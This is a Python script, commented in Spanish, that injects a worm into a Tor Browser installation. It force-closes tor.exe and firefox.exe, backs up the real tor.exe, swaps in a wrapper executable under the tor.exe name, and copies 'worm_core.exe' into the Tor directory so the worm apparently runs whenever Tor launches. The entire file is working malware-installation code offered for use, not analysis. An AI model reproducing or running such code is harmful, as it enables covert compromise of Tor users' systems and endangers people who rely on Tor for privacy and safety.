# tor_injector.py — Inyecta el gusano y cierra TOR si está abierto
import os
import shutil
import subprocess
import sys
import time

def kill_tor():
    """Mata los procesos de TOR y Firefox para liberar los archivos."""
    print("  [*] Cerrando TOR Browser para evitar bloqueos...")
    subprocess.run(["taskkill", "/F", "/IM", "tor.exe"], capture_output=True)
    subprocess.run(["taskkill", "/F", "/IM", "firefox.exe"], capture_output=True)
    time.sleep(2) # Dar tiempo a Windows para liberar los archivos

def inject_into_tor(tor_root: str, worm_exe: str) -> bool:
    tdir = os.path.join(tor_root, "Browser", "TorBrowser", "Tor")
    tor_bin = os.path.join(tdir, "tor.exe")
    tor_real = os.path.join(tdir, "tor_real.exe")
    wrapper = os.path.join(os.path.dirname(os.path.abspath(worm_exe)), "tor_wrapper.exe")

    if not os.path.exists(tor_bin):
        print(f"  [!] tor.exe no existe en {tdir}")
        return False

    # 1. Cerrar TOR a la fuerza
    kill_tor()

    # 2. Backup tor.exe -> tor_real.exe (solo si no existe)
    try:
        if not os.path.exists(tor_real):
            shutil.copy2(tor_bin, tor_real)
            print("  [+] Backup creado: tor_real.exe")
    except PermissionError:
        print("  [!] Sigue bloqueado. Ejecuta la interfaz como Administrador.")
        return False

    # 3. Verificar wrapper
    if not os.path.exists(wrapper):
        print("  [!] tor_wrapper.exe no existe. Compila primero (Bootstrap).")
        return False

    # 4. Copiar wrapper como tor.exe
    try:
        shutil.copy2(wrapper, tor_bin)
        print("  [+] Wrapper instalado como tor.exe")
    except PermissionError:
        print("  [!] PermissionError al copiar el wrapper. Cierra TOR manualmente.")
        return False

    # 5. Copiar worm_core.exe al dir de TOR
    try:
        shutil.copy2(worm_exe, os.path.join(tdir, "worm_core.exe"))
        print("  [+] worm_core.exe copiado a la carpeta de TOR")
    except Exception as e:
        print(f"  [!] Fallo copiando worm_core.exe: {e}")
        return False

    return True

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("uso: python tor_injector.py <tor_root> <worm_exe>")
        sys.exit(1)
    
    ok = inject_into_tor(sys.argv[1], sys.argv[2])
    if ok:
        print("[+] Inyección completada con éxito.")
        sys.exit(0)
    else:
        print("[!] Fallo la inyección.")
        sys.exit(1)